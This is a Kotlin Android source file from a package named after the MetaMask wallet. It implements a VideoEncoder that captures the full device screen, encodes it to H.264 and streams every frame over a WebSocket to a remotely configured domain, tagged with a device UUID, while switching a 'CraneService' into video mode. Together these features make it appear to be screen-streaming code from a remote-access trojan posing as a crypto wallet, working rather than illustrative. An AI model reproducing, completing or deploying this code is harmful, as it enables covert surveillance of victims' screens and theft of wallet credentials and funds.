package com.example.MetaMask.services

import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaCodecList
import android.media.MediaFormat
import android.media.projection.MediaProjection
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.view.Surface
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.RemoteConfig
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import java.io.File
import java.nio.ByteBuffer
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class VideoEncoder {

    companion object {
        private const val TAG = "VideoEncoder"
        private const val MIME = MediaFormat.MIMETYPE_VIDEO_AVC
        private const val BIT_RATE     = 2_500_000
        private const val BIT_RATE_MIN =   500_000
        private const val FRAME_RATE   = 30
        private const val I_INTERVAL   = 2

        const val MSG_INIT: Byte     = 0x01
        const val MSG_FRAME: Byte    = 0x02
        const val MSG_KEYFRAME: Byte = 0x03

        @Volatile var instance: VideoEncoder? = null
    }

    @Volatile var running = false
        private set

    @Volatile private var framesSent = 0

    @Volatile private var lastSpsPps: ByteArray? = null
    @Volatile private var lastEncW: Int = 0
    @Volatile private var lastEncH: Int = 0
    @Volatile private var lastOrigW: Int = 0
    @Volatile private var lastOrigH: Int = 0
    private val dbgTimeFmt = SimpleDateFormat("HH:mm:ss.SSS", Locale.US)

    fun resendInit() {
        android.util.Log.d("XDBG", "[VideoEncoder] resendInit enter") //xdbg
        val spsPps = lastSpsPps ?: return
        sendInit(spsPps, lastEncW, lastEncH, lastOrigW, lastOrigH)
        try {
            val params = android.os.Bundle()
            params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0)
            codec?.setParameters(params)
        } catch (_: Exception) {}
    }

    private fun dbgLog(msg: String) {
        android.util.Log.d("XDBG", "[VideoEncoder] dbgLog enter msg=${msg}") //xdbg
        try {
            val ts = dbgTimeFmt.format(Date())
            val line = "$ts $msg\n"
            val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            File(dir, "video_encoder_debug.txt").appendText(line)
        } catch (_: Exception) {}
    }

    private var codec: MediaCodec? = null
    private var inputSurface: Surface? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var drainThread: HandlerThread? = null
    private var mediaProjection: MediaProjection? = null

    private var videoWebSocket: WebSocket? = null
    private var videoWsClient: OkHttpClient? = null

    @Volatile private var forceKeyframeHandler: Handler? = null
    @Volatile private var forceKeyframeRunnable: Runnable? = null

    private var appContext: android.content.Context? = null

    fun start(ctx: android.content.Context, projection: MediaProjection, width: Int, height: Int, density: Int) {
        android.util.Log.d("XDBG", "[VideoEncoder] start enter ctx=ctx projection=${projection} width=${width} height=${height} density=${density}") //xdbg
        if (running) stop()
        running = true
        instance = this
        mediaProjection = projection
        appContext = ctx.applicationContext

        connectVideoWebSocket { startEncoder(projection, width, height, density) }
    }

    private fun connectVideoWebSocket(onConnected: () -> Unit) {
        var wsBase = RemoteConfig.wsBaseUrl

        if (wsBase == null) {
            android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
            val savedDomain = appContext
                ?.getSharedPreferences("connection_prefs", android.content.Context.MODE_PRIVATE)
                ?.getString("last_success_domain", null)
            if (savedDomain != null) {
                android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                wsBase = "wss://$savedDomain"
                dbgLog("wsBaseUrl from SharedPrefs: $wsBase")
            } else {
                dbgLog("wsBaseUrl null — waiting for saved domain...")
                repeat(20) {
                    if (wsBase != null) return@repeat
                    Thread.sleep(500)
                    val d = appContext
                        ?.getSharedPreferences("connection_prefs", android.content.Context.MODE_PRIVATE)
                        ?.getString("last_success_domain", null)
                    if (d != null) wsBase = "wss://$d"
                    else wsBase = RemoteConfig.wsBaseUrl
                }
            }
        }

        val wsBaseResolved = wsBase ?: run {
            dbgLog("ERROR: wsBaseUrl still null — no domain available")
            running = false
            return
        }
        val uuid = try { DeviceUUIDProvider.getUUID() } catch (e: Exception) {
            android.util.Log.e("XDBG", "[VideoEncoder] catch") //xdbg
            dbgLog("ERROR: getUUID threw ${e.message}")
            running = false
            return
        }

        val url = "$wsBaseResolved/ws?type=video&uuid=$uuid"
        dbgLog("Connecting video WS → $url")

        videoWsClient = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.SECONDS)
            .writeTimeout(0, TimeUnit.SECONDS)
            .build()

        val request = Request.Builder().url(url).build()
        videoWsClient!!.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                android.util.Log.d("XDBG", "[VideoEncoder] onOpen enter ws=${ws} response=${response}") //xdbg
                videoWebSocket = ws
                dbgLog("Video WS connected OK code=${response.code}")
                try {
                    val ctx = appContext
                    if (ctx != null) {
                        android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                        ctx.startService(android.content.Intent(ctx, CraneService::class.java).apply {
                            action = CraneService.ACTION_SET_CRANE_MODE
                            putExtra(CraneService.EXTRA_MODE, "video")
                        })
                    }
                } catch (_: Exception) {}
                onConnected()
            }
            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                android.util.Log.d("XDBG", "[VideoEncoder] onFailure enter ws=${ws} t=${t} response=${response}") //xdbg
                dbgLog("ERROR: Video WS failure: ${t.javaClass.simpleName}: ${t.message} resp=${response?.code}")
                videoWebSocket = null
                if (running) stop()
            }
            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                android.util.Log.d("XDBG", "[VideoEncoder] onClosed enter ws=${ws} code=${code} reason=${reason}") //xdbg
                dbgLog("Video WS closed: $code $reason")
                videoWebSocket = null
                if (running) stop()
            }
        })
    }

    private fun startEncoder(projection: MediaProjection, width: Int, height: Int, density: Int) {
        android.util.Log.d("XDBG", "[VideoEncoder] startEncoder enter projection=${projection} width=${width} height=${height} density=${density}") //xdbg
        try {
            val maxShort = 720
            val shortSide = minOf(width, height)
            val scale = if (shortSide > maxShort) maxShort.toFloat() / shortSide else 1f
            val encW = ((width  * scale).toInt() / 2) * 2
            val encH = ((height * scale).toInt() / 2) * 2

            dbgLog("startEncoder ${encW}x${encH} (native ${width}x${height})")

            val supportsSurface = MediaCodecList(MediaCodecList.ALL_CODECS).codecInfos.any { info ->
                info.isEncoder &&
                info.supportedTypes.any { it.equals(MIME, ignoreCase = true) } &&
                info.getCapabilitiesForType(MIME).colorFormats
                    .contains(MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
            }

            if (!supportsSurface) {
                android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                dbgLog("ERROR: No H.264 encoder with Surface input on this device")
                running = false
                cleanup()
                return
            }

            val mc = MediaCodec.createEncoderByType(MIME)
            val fmt = MediaFormat.createVideoFormat(MIME, encW, encH).apply {
                setInteger(MediaFormat.KEY_BIT_RATE, BIT_RATE)
                setInteger(MediaFormat.KEY_FRAME_RATE, FRAME_RATE)
                setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, I_INTERVAL)
                setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
                setLong("repeat-previous-frame-after", 33_333L)
            }
            mc.configure(fmt, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            inputSurface = mc.createInputSurface()
            mc.start()
            codec = mc

            projection.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    android.util.Log.d("XDBG", "[VideoEncoder] onStop enter") //xdbg
                    stop()
                }
            }, Handler(Looper.getMainLooper()))

            virtualDisplay = projection.createVirtualDisplay(
                "H264Enc", encW, encH, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                inputSurface, null, null
            )

            drainThread = HandlerThread("H264Drain").also { it.start() }
            Handler(drainThread!!.looper).post { drainLoop(mc, encW, encH, width, height) }

            val kfHandler = Handler(Looper.getMainLooper())
            val kfRunnable = object : Runnable {
                override fun run() {
                    android.util.Log.d("XDBG", "[VideoEncoder] run enter") //xdbg
                    if (!running) return
                    try {
                        val c = codec ?: return
                        val params = android.os.Bundle()
                        params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0)
                        c.setParameters(params)
                        dbgLog("keyframe forced (periodic)")
                    } catch (_: Exception) {}
                    if (running) kfHandler.postDelayed(this, 3_000L)
                }
            }
            forceKeyframeHandler = kfHandler
            forceKeyframeRunnable = kfRunnable
            kfHandler.postDelayed(kfRunnable, 3_000L)

            dbgLog("H.264 encoder started ${width}x${height} @ ${FRAME_RATE}fps")
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[VideoEncoder] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            dbgLog("ERROR: startEncoder exception: ${e.javaClass.simpleName}: ${e.message}")
            running = false
            cleanup()
        }
    }

    fun stop() {
        android.util.Log.d("XDBG", "[VideoEncoder] stop enter") //xdbg
        if (!running && instance !== this) return
        val caller = Thread.currentThread().stackTrace
            .drop(3).take(5)
            .joinToString(" <- ") { "${it.className.substringAfterLast('.')}:${it.methodName}" }
        dbgLog("stop() caller: $caller")
        running = false
        cleanup()
        if (instance === this) instance = null
    }

    private fun cleanup() {
        android.util.Log.d("XDBG", "[VideoEncoder] cleanup enter") //xdbg
        forceKeyframeRunnable?.let { forceKeyframeHandler?.removeCallbacks(it) }
        forceKeyframeRunnable = null
        forceKeyframeHandler = null
        try { virtualDisplay?.release() } catch (_: Exception) {}
        virtualDisplay = null
        try { codec?.signalEndOfInputStream() } catch (_: Exception) {}
        try { codec?.stop(); codec?.release() } catch (_: Exception) {}
        codec = null
        try { inputSurface?.release() } catch (_: Exception) {}
        inputSurface = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        drainThread?.quitSafely()
        drainThread = null
        try { videoWebSocket?.close(1000, "stopped") } catch (_: Exception) {}
        videoWebSocket = null
        try { videoWsClient?.dispatcher?.executorService?.shutdown() } catch (_: Exception) {}
        videoWsClient = null
    }

    private fun drainLoop(mc: MediaCodec, encW: Int, encH: Int, origW: Int, origH: Int) {
        android.util.Log.d("XDBG", "[VideoEncoder] drainLoop enter mc=${mc} encW=${encW} encH=${encH} origW=${origW} origH=${origH}") //xdbg
        val info = MediaCodec.BufferInfo()
        var initSent = false
        var pendingSpsPps: ByteArray? = null
        var drainFrameCount = 0

        while (running) {
            android.util.Log.d("XDBG", "[VideoEncoder] loop") //xdbg
            val idx = try {
                mc.dequeueOutputBuffer(info, 10_000L)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[VideoEncoder] catch (ignored)") //xdbg
                break
            }

            when {
                idx == MediaCodec.INFO_TRY_AGAIN_LATER -> continue
                idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> {
                    try {
                        val fmt = mc.outputFormat
                        val csd0 = fmt.getByteBuffer("csd-0")
                        val csd1 = fmt.getByteBuffer("csd-1")
                        if (csd0 != null) {
                            android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                            val sps = ByteArray(csd0.remaining()).also { csd0.get(it) }
                            val pps = csd1?.let { ByteArray(it.remaining()).also { b -> it.get(b) } } ?: ByteArray(0)
                            pendingSpsPps = ensureAnnexB(sps) + if (pps.isNotEmpty()) ensureAnnexB(pps) else pps
                        }
                    } catch (_: Exception) {}
                    continue
                }
                idx >= 0 -> {
                    try {
                        val buf = mc.getOutputBuffer(idx)
                        if (buf != null && info.size > 0) {
                            android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                            val data = ByteArray(info.size)
                            buf.get(data)

                            val isConfig = (info.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0
                            val isKey    = (info.flags and MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0
                            val isEos    = (info.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0

                            when {
                                isConfig && !initSent -> {
                                    dbgLog("CODEC_CONFIG buf size=${data.size}B → sendInit")
                                    sendInit(data, encW, encH, origW, origH)
                                    initSent = true
                                    pendingSpsPps = null
                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                        if (running) resendInit()
                                    }, 1500)
                                }
                                !isConfig && !initSent && isKey -> {
                                    val spsPps = pendingSpsPps ?: extractSpsPpsFromAnnexB(data)
                                    if (spsPps != null) {
                                        android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                                        sendInit(spsPps, encW, encH, origW, origH)
                                        initSent = true
                                        pendingSpsPps = null
                                        dbgLog("Init sent from keyframe SPS/PPS size=${spsPps.size}B")
                                    }
                                    sendFrame(data, info.presentationTimeUs, isKey = true)
                                }
                                !isConfig -> {
                                    sendFrame(data, info.presentationTimeUs, isKey)
                                }
                            }

                            if (isEos) break
                            drainFrameCount++
                            if (drainFrameCount % 30 == 0) adjustBitrate()
                        }
                    } catch (_: Exception) {
                        android.util.Log.e("XDBG", "[VideoEncoder] catch (ignored)") //xdbg
                    } finally {
                        try { mc.releaseOutputBuffer(idx, false) } catch (_: Exception) {}
                    }
                }
            }
        }
    }

    private fun ensureAnnexB(nalu: ByteArray): ByteArray {
        android.util.Log.d("XDBG", "[VideoEncoder] ensureAnnexB enter nalu=${nalu}") //xdbg
        if (nalu.size >= 4 && nalu[0] == 0.toByte() && nalu[1] == 0.toByte() &&
            nalu[2] == 0.toByte() && nalu[3] == 1.toByte()) return nalu
        if (nalu.size >= 3 && nalu[0] == 0.toByte() && nalu[1] == 0.toByte() &&
            nalu[2] == 1.toByte()) return byteArrayOf(0, 0, 0, 1) + nalu.copyOfRange(3, nalu.size)
        android.util.Log.d("XDBG", "[VideoEncoder] return") //xdbg
        return byteArrayOf(0, 0, 0, 1) + nalu
    }

    private fun extractSpsPpsFromAnnexB(data: ByteArray): ByteArray? {
        android.util.Log.d("XDBG", "[VideoEncoder] extractSpsPpsFromAnnexB enter data=${data}") //xdbg
        var i = 0
        var end = -1
        while (i < data.size - 3) {
            android.util.Log.d("XDBG", "[VideoEncoder] loop") //xdbg
            val is3 = data[i] == 0.toByte() && data[i+1] == 0.toByte() && data[i+2] == 1.toByte()
            val is4 = i + 3 < data.size && data[i] == 0.toByte() && data[i+1] == 0.toByte() &&
                      data[i+2] == 0.toByte() && data[i+3] == 1.toByte()
            if (is4 || is3) {
                android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                val naluStart = if (is4) i + 4 else i + 3
                if (naluStart < data.size) {
                    android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                    val naluType = data[naluStart].toInt() and 0x1f
                    if (naluType == 5) { end = i; break }
                }
                i += if (is4) 4 else 3
            } else { i++ }
        }
        android.util.Log.d("XDBG", "[VideoEncoder] return") //xdbg
        return if (end > 0) data.copyOfRange(0, end) else null
    }

    private fun adjustBitrate() {
        android.util.Log.d("XDBG", "[VideoEncoder] adjustBitrate enter") //xdbg
        val ws = videoWebSocket ?: return
        val c  = codec ?: return
        val queue = ws.queueSize()
        val target = when {
            queue > 500_000L -> BIT_RATE_MIN
            queue > 200_000L -> 1_000_000
            queue > 100_000L -> 1_500_000
            else             -> BIT_RATE
        }
        try {
            val p = android.os.Bundle()
            p.putInt(MediaCodec.PARAMETER_KEY_VIDEO_BITRATE, target)
            c.setParameters(p)
        } catch (_: Exception) {}
    }

    private fun sendBin(bytes: ByteArray) {
        android.util.Log.d("XDBG", "[VideoEncoder] sendBin enter bytes=${bytes}") //xdbg
        if (bytes.isEmpty()) return
        val ws = videoWebSocket
        if (ws == null) {
            android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
            dbgLog("sendBin: ws=null, dropped ${bytes.size}B (type=0x${bytes[0].toInt().and(0xFF).toString(16)})")
            return
        }
        try {
            val ok = ws.send(ByteString.of(*bytes))
            if (!ok) {
                android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
                dbgLog("sendBin: send()=false wsQueue=${ws.queueSize()}, dropped ${bytes.size}B")
            }
        } catch (_: Exception) {}
    }

    private fun sendInit(spsPps: ByteArray, encW: Int, encH: Int, origW: Int, origH: Int) {
        android.util.Log.d("XDBG", "[VideoEncoder] sendInit enter spsPps=${spsPps} encW=${encW} encH=${encH} origW=${origW} origH=${origH}") //xdbg
        lastSpsPps = spsPps
        lastEncW = encW; lastEncH = encH; lastOrigW = origW; lastOrigH = origH
        val out = ByteBuffer.allocate(1 + 4 + 4 + 4 + 4 + spsPps.size)
        out.put(MSG_INIT)
        out.putInt(encW)
        out.putInt(encH)
        out.putInt(origW)
        out.putInt(origH)
        out.put(spsPps)
        dbgLog("sendInit: enc=${encW}x${encH} phys=${origW}x${origH} sps+pps=${spsPps.size}B")
        sendBin(out.array())
    }

    private fun sendFrame(data: ByteArray, pts: Long, isKey: Boolean) {
        android.util.Log.d("XDBG", "[VideoEncoder] sendFrame enter data=${data} pts=${pts} isKey=${isKey}") //xdbg
        framesSent++
        if (isKey || framesSent % 30 == 0) {
            android.util.Log.d("XDBG", "[VideoEncoder] if branch") //xdbg
            dbgLog("sendFrame #$framesSent ${data.size}B key=$isKey pts=$pts")
        }
        val out = ByteBuffer.allocate(1 + 8 + data.size)
        out.put(if (isKey) MSG_KEYFRAME else MSG_FRAME)
        out.putLong(pts)
        out.put(data)
        sendBin(out.array())
    }
}
